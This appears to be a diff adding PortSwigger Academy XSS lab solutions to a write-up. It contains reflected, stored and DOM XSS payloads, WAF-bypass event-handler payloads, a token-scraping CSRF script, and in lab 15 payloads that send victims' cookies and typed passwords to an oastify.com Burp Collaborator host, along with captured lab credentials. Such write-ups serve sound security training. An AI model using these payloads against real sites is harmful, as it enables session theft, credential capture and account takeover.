@@ -1,3 +1,35 @@
+01 Reflected XSS into HTML context with nothing encoded
+==========================================================
+
+This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
+
+To solve the lab, perform a cross-site scripting attack that calls the alert function.
+
+---------------------------------------------
+
+Reference: https://portswigger.net/web-security/cross-site-scripting/reflected
+
+---------------------------------------------
+
+There is a search functionality that takes the user input and uses it to generate the next HTML code:
+
+
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded/1.png)
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded/2.png)
+
+
+Searching “<script>alert(1)</script>” you see the alert popping:
+
+
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded/3.png)
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20nothing%20encoded/4.png)
+
 02 Stored XSS into HTML context with nothing encoded
 ====================================================
 
@@ -16,6 +48,55 @@ There is a functionality to post comments in each blog post:
 If you check the blog post again you see the alert popping:
 
 ![img](media/66cf231fb7888ad277f5fd4cf1632522.png)
+
+
+03 DOM XSS in document.write sink using source location.search
+=============================================================
+This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search, which you can control using the website URL.
+
+To solve this lab, perform a cross-site scripting attack that calls the alert function.
+
+---------------------------------------------
+
+References:
+
+- https://portswigger.net/web-security/cross-site-scripting/dom-based
+
+---------------------------------------------
+
+
+There is a search function in "/?search=":
+
+
+
+![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/1.png)
+
+In the source code we see the sink:
+
+```
+function trackSearch(query) {
+    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+    trackSearch(query);
+}
+```
+
+
+
+![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/2.png)
+
+We can pop an alert with the payload:
+
+```
+"><script>alert(1)</script>
+```
+
+
+
+
+![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search/3.png)
 
 04 DOM XSS in innerHTML sink using source location.search
 =========================================================
@@ -228,6 +309,68 @@ With this payload the alert pops:
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 ![img](media/a1b4bc32e92d1eb57be94f46cd9c1184.png)
+
+
+10 DOM XSS in document.write sink using source location.search inside a select element
+=======================================================================================
+
+This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript document.write function, which writes data out to the page. The document.write function is called with data from location.search which you can control using the website URL. The data is enclosed within a select element.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.
+
+---------------------------------------------
+
+References:
+
+- https://portswigger.net/web-security/cross-site-scripting/dom-based
+
+---------------------------------------------
+
+
+The sink is:
+
+```
+var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('<select name="storeId">');
+if(store) {
+    document.write('<option selected>'+store+'</option>');
+}
+for(var i=0;i<stores.length;i++) {
+    if(stores[i] === store) {
+        continue;
+    }
+    document.write('<option>'+stores[i]+'</option>');
+}
+document.write('</select>');
+```
+
+
+
+
+![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/1.png)
+
+
+The parameter storeId is written between "<option selected>" and "</option>". That means if we add that value in the GET request it appears between the options, for example accessing "/product?productId=4&storeId=1":
+
+
+
+![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/2.png)
+
+
+To escape the option tags we can use the payload:
+
+```
+</option><script>alert(1)</script><option selected>
+```
+
+```
+/product?productId=4&storeId=</option><script>alert(1)</script><option%20selected>
+```
+
+
+
+![img](images/DOM%20XSS%20in%20document.write%20sink%20using%20source%20location.search%20inside%20a%20select%20element/3.png)
 
 11 DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 =====================================================================================
@@ -473,6 +616,388 @@ Then intercept the request to the Home page and add these cookies:
 
 ![img](media/9fb16a3605e8521cfa43757ebb0252d9.png)
 
+
+15 Exploiting cross-site scripting to capture passwords
+=======================================================
+
+This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account.
+
+Note: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.
+
+Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the credentials.
+
+---------------------------------------------
+
+Reference: https://portswigger.net/web-security/cross-site-scripting
+
+---------------------------------------------
+
+Generated link: https://0a4b0017031c1eafc216d371007b007a.web-security-academy.net/
+
+
+We test the most simple XSS payload:
+
+
+
+![img](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/1.png)
+
+It gets executed:
+
+
+
+![img](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/2.png)
+
+
+Next we test a payload from https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md: 
+
+```
+<script>var i=new Image;i.src="http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie="+document.cookie;</script>
+```
+
+Or
+
+```
+<img src=x onerror="this.src='http://ecu0uhyerytdj8d8vdyuowv8zz5qtlha.oastify.com/?cookie='+document.cookie; this.removeAttribute('onerror');">
+```
+
+
+
+
+![img](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/3.png)
+
+We get an HTTP request with the cookie:
+
+
+
+![img](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/4.png)
+
+Next I opened the Firefox debugger's Console and set the cookie:
+
+```
+document.cookie="secret=5yN1hPLMMamjE1mFPVb7ocKMq7BSYyTK"
+```
+
+
+
+![img](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/5.png)
+
+But that does not work...
+
+
+Solution:
+
+```
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+```
+
+
+
+![img](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/6.png)
+
+Collaborator response:
+
+
+
+![img](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/7.png)
+
+Solved with credentials administrator:ec7ga43qyd9zisyb4h4i:
+
+
+
+![img](images/Exploiting%20cross-site%20scripting%20to%20capture%20passwords/8.png)
+
+16 Exploiting XSS to perform CSRF
+==================================
+
+This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
+
+You can log in to your own account using the following credentials: wiener:peter
+
+Learning path: If you're following our suggested learning path, please note that this lab requires some understanding of topics that we haven't covered yet. Don't worry if you get stuck; try coming back later once you've developed your knowledge further.
+
+Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.
+
+---------------------------------------------
+
+References: 
+
+- https://portswigger.net/web-security/cross-site-scripting/exploiting
+
+- https://portswigger.net/blog/exploiting-xss-in-post-requests
+
+- https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/send
+
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/1.png)
+
+---------------------------------------------
+
+
+There is a function to update the email:
+
+
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/2.png)
+
+It is a POST message:
+
+
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/3.png)
+
+
+There is a function to post comments:
+
+
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/4.png)
+
+
+These payload work:
+
+```
+</p><img src=x onerror=alert(1) /><p>
+<script>alert(1)</script>
+```
+
+
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/5.png)
+
+
+We use this payload (similar to the one in https://portswigger.net/blog/exploiting-xss-in-post-requests):
+
+```
+<form name=TheForm action=https://0a8100660449e28b80a50877005400f4.web-security-academy.net/my-account/change-email method=post>
+<input type=hidden name="csrf" value="wV6Kw7g2mIv6JLKjoQjmb3Nd6BhhXbmg">
+<input type=hidden name="email" value="test7@test.com">
+</form>
+<script>
+document.TheForm.submit();
+</script>
+```
+
+
+When accessing the page, it creates a POST message:
+
+
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/6.png)
+
+
+And the email of my user changes to test7@test.com:
+
+
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/7.png)
+
+
+It is not working because we are using a hardcoded value for the CSRF token. We can take the value from the hidden value “csrf” of the page:
+
+
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/8.png)
+
+
+The csrf element uses the name so we can grab the content with:
+
+```
+document.getElementsByName('csrf')[0].value
+```
+
+However, if we do this we can not create a form with a csrf tag like we did before. But we can grab the CSRF token from "/my-account" and use a regular expression to get the content and set the value of the csrf element in the created form, and the submit the form:
+
+```
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var csrf_token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+  console.log(csrf_token);
+  var xhr = new XMLHttpRequest();
+  xhr.open("POST", '/my-account/change-email', true);
+  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+  xhr.onreadystatechange = () => { 
+    if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
+    }
+  }
+  xhr.send("email=test12@test.com&csrf="+csrf_token);
+};
+</script>
+```
+
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/9.png)
+![img](images/Exploiting%20XSS%20to%20perform%20CSRF/10.png)
+
+17 Reflected XSS into HTML context with most tags and attributes blocked
+========================================================================
+
+This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
+
+To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.
+
+Note: Your solution must not require any user interaction. Manually causing print() to be called in your own browser will not solve the lab.
+
+---------------------------------------------
+
+References: 
+
+- https://portswigger.net/web-security/cross-site-scripting/exploiting
+
+- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+---------------------------------------------
+
+The content of the search is reflected inside a h1 HTML element:
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/1.png)
+
+
+
+If we try to add a tag "h1" it gets blocked:
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/2.png)
+
+
+But not if it is "h2":
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/3.png)
+
+
+With this payload the HTML is generated correctly:
+
+```
+<h3>a</h3>
+```
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/4.png)
+
+
+With this payload it says “Attribute is not allowed”:
+
+```
+<h3 onerror=alert(1)>a</h3>
+```
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/5.png)
+
+
+I sent it to Intruder and got all events from https://portswigger.net/web-security/cross-site-scripting/cheat-sheet:  
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/6.png)
+
+
+The only ones working:
+- onbeforeinput
+- onratechange
+- onscrollend
+- onresize
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/7.png)
+
+
+I will do the same for the tags, in this case using Battery Ram attack type:
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/8.png)
+
+
+The only ones working:
+- custom tags
+- body
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/9.png)
+
+
+
+The information in the cheatsheet from these attributes is:
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/10.png)
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/11.png)
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/12.png)
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/13.png)
+
+
+
+So we have 3 possible payloads, because as "audio" and “video” tags are not available we can not use "onratechange":
+
+```
+<xss contenteditable onbeforeinput=alert(1)>test
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></xss>
+<body onresize="print()">
+```
+
+
+Regarding the "onscrollend" payload, I updated it because it can not use “br” or “span”. However, it is necessary to scroll to the top or the bottom to see the alert pop:
+
+```
+<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><h2>a</h2><h3 id=x>test</h3></h3>
+```
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/14.png)
+
+
+Regarding the “onbeforeinput” payload, it is necessary to click the text and update it for the alert to pop:
+
+```
+<xss contenteditable onbeforeinput=alert(1)>test</xss>
+```
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/15.png)
+
+
+
+The third one is valid but it needs the user to change the size of the tab:
+
+```
+<body onresize="print()">
+```
+
+
+
+![img](images/Reflected%20XSS%20into%20HTML%20context%20with%20most%20tags%20and%20attributes%20blocked/16.png)
+
+
+
+We will send this last one inside an iframe:
+
+```
+https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E
+```
+
+```
+<iframe src="https://0ad100ff04e7e76582e088af00ae0026.web-security-academy.net/?search=%3Cbody+onresize%3Dprint%28%29%3E" height="100%" title="Iframe Example" onload=body.style.width='100%'></iframe>
+```
+
 18 Reflected XSS into HTML context with all tags blocked except custom ones
 ===========================================================================
 
@@ -623,6 +1148,45 @@ A correct payload:
 ![img](media/df9c217459be143754ef02274ea04697.png)
 
 ![img](media/5f6ea8531ee8d4fcb65a1f1071d6d4ec.png)
+
+21 Reflected XSS into a JavaScript string with single quote 
+============================================================
+
+This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function.
+
+---------------------------------------------
+
+References: 
+
+- https://portswigger.net/web-security/cross-site-scripting/contexts
+
+
+
+![img](images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote/1.png)
+
+---------------------------------------------
+
+The content of the search is reflected inside a h1 HTML element and a variable in Javascript with single quotes:
+
+
+
+![img](images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote/2.png)
+
+
+I used the payload:
+
+```
+';</script><img src=x onerror=alert(1)><script>var a='a
+```
+
+
+
+
+
+![img](images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote/3.png)
+![img](images/Reflected%20XSS%20into%20a%20JavaScript%20string%20with%20single%20quote/4.png)
 
 22 Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped
 ======================================================================================================================
